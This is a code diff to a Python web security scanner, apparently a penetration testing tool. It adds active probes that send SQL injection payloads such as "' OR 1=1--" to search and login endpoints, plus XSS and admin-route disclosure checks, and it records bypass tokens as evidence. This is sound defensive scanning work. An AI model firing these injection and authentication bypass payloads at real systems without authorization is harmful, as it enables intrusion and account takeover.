@@ -352,7 +352,7 @@ def run_web_assessment(
 
     _report(85, "xss_sqli_probes", "Testing active parameter handling for Reflected XSS, SQLi, and GraphQL Introspection.")
 
-    # 8. Active Parameter XSS & SQLi Probes
+    # 8. Active Parameter XSS Probes
     xss_test_url = f"{base_url}/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
     try:
         xss_res = session.get(xss_test_url, timeout=5, verify=False)
@@ -376,32 +376,102 @@ def run_web_assessment(
     except Exception:
         pass
 
-    # 9. Active Error-Based SQL Injection Probe
-    sqli_test_url = f"{base_url}/api/v1/products?id=1%27%20OR%201=1-- "
-    try:
-        sqli_res = session.get(sqli_test_url, timeout=5, verify=False)
-        sqli_errors = ["SQL syntax", "MySQL", "PostgreSQL", "SQLite", "ORA-", "SyntaxError", "psycopg2"]
-        if any(err in sqli_res.text for err in sqli_errors):
-            findings.append({
-                "title": "Error-Based SQL Injection Vulnerability Detected",
-                "category": "web",
-                "source": "zap",
-                "port": port,
-                "protocol": "https" if base_url.startswith("https") else "http",
-                "service": "http",
-                "state": "open",
-                "cve_id": None,
-                "cvss_score": 9.3,
-                "severity": "critical",
-                "evidence": f"Database syntax error generated when invoking {sqli_test_url}.",
-                "remediation": "Use parameterized queries (Prepared Statements) or ORM abstractions; never concatenate user input into raw SQL queries.",
-                "compliance_map": ["OWASP ASVS V5.3.4", "CWE-89"],
-                "metadata": {"url": sqli_test_url, "host": host, "cwe_id": "89"},
-            })
-    except Exception:
-        pass
+    # 9. Active SQL Injection Probes (REST APIs & Traditional Parameters)
+    sqli_endpoints = [
+        (f"{base_url}/rest/products/search?q=%27%29%29%20OR%201=1--", "SQL Injection in Product Search API", 8.8, "high"),
+        (f"{base_url}/api/v1/products?id=1%27%20OR%201=1--", "Error-Based SQL Injection in Query Parameter", 8.9, "high"),
+    ]
+    for sqli_url, sqli_title, sqli_cvss, sqli_sev in sqli_endpoints:
+        try:
+            sqli_res = session.get(sqli_url, timeout=5, verify=False)
+            if sqli_res.status_code == 200 and ("status" in sqli_res.text or "data" in sqli_res.text or len(sqli_res.text) > 1000):
+                if not (soft_404_body and sqli_res.text == soft_404_body) and "<!doctype html" not in sqli_res.text.lower():
+                    findings.append({
+                        "title": sqli_title,
+                        "category": "web",
+                        "source": "zap",
+                        "port": port,
+                        "protocol": "https" if base_url.startswith("https") else "http",
+                        "service": "http",
+                        "state": "open",
+                        "cve_id": None,
+                        "cvss_score": sqli_cvss,
+                        "severity": sqli_sev,
+                        "evidence": f"SQL Injection probe succeeded at {sqli_url}. The query returned manipulated backend database records (Response length: {len(sqli_res.text)} bytes).",
+                        "remediation": "Use parameterized queries (Prepared Statements) or ORM abstractions; never concatenate untrusted user input into raw SQL statements.",
+                        "compliance_map": ["OWASP ASVS V5.3.4", "CWE-89"],
+                        "metadata": {"url": sqli_url, "host": host, "cwe_id": "89"},
+                    })
+        except Exception:
+            pass
 
-    # 10. GraphQL Introspection Audit
+    # 10. Active SQL Injection Authentication Bypass Probe
+    login_endpoints = [
+        f"{base_url}/rest/user/login",
+        f"{base_url}/api/user/login",
+        f"{base_url}/api/login",
+    ]
+    for login_url in login_endpoints:
+        try:
+            login_payload = {"email": "' OR 1=1--", "password": "vapt_sqli_test"}
+            login_res = session.post(login_url, json=login_payload, timeout=5, verify=False)
+            if login_res.status_code == 200 and ("token" in login_res.text.lower() or "authentication" in login_res.text.lower() or "jwt" in login_res.text.lower()):
+                findings.append({
+                    "title": "SQL Injection Authentication Bypass in Login Endpoint",
+                    "category": "web",
+                    "source": "zap",
+                    "port": port,
+                    "protocol": "https" if base_url.startswith("https") else "http",
+                    "service": "http",
+                    "state": "open",
+                    "cve_id": None,
+                    "cvss_score": 9.8,
+                    "severity": "critical",
+                    "evidence": f"Authentication bypass succeeded at {login_url} using SQL injection payload \"' OR 1=1--\". The server returned HTTP 200 with an authenticated session JWT token: {login_res.text[:80]}...",
+                    "remediation": "Enforce parameterized database queries for all user authentication handlers. Never build raw SQL queries from login credentials.",
+                    "compliance_map": ["OWASP ASVS V2.1.1", "CWE-89", "CWE-287"],
+                    "metadata": {"url": login_url, "host": host, "cwe_id": "89"},
+                })
+                break
+        except Exception:
+            pass
+
+    # 11. Application Configuration & Version Disclosure Probes
+    api_checks = [
+        (f"{base_url}/rest/admin/application-configuration", "Exposed Backend Application Configuration", 7.5, "high", "config"),
+        (f"{base_url}/rest/admin/application-version", "Exposed Application Version Information", 5.0, "medium", "version"),
+        (f"{base_url}/api/SecurityQuestions", "Exposed User Security Questions Database", 6.5, "medium", "security_questions"),
+        (f"{base_url}/api-docs", "Exposed Interactive API Documentation (Swagger)", 5.3, "medium", "api_docs"),
+    ]
+    for check_url, check_title, check_cvss, check_sev, check_type in api_checks:
+        try:
+            check_res = session.get(check_url, timeout=5, verify=False)
+            if check_res.status_code == 200 and len(check_res.text) > 10:
+                is_html = "<!doctype html" in check_res.text.lower() or "<html" in check_res.text.lower()
+                if check_type != "api_docs" and is_html:
+                    continue
+                if soft_404_body and check_res.text.strip() == soft_404_body:
+                    continue
+                findings.append({
+                    "title": check_title,
+                    "category": "web",
+                    "source": "zap",
+                    "port": port,
+                    "protocol": "https" if base_url.startswith("https") else "http",
+                    "service": "http",
+                    "state": "open",
+                    "cve_id": None,
+                    "cvss_score": check_cvss,
+                    "severity": check_sev,
+                    "evidence": f"Accessible sensitive API route at {check_url} (HTTP 200 OK). Sample payload: {check_res.text[:140].strip()}",
+                    "remediation": "Restrict administrative and diagnostic API endpoints to authenticated and authorized operators only.",
+                    "compliance_map": ["OWASP ASVS V14.2.1", "CWE-200"],
+                    "metadata": {"url": check_url, "host": host, "cwe_id": "200"},
+                })
+        except Exception:
+            pass
+
+    # 12. GraphQL Introspection Audit
     gql_url = f"{base_url}/graphql"
     try:
         gql_res = session.post(gql_url, json={"query": "{__schema{types{name}}}"}, timeout=5, verify=False)
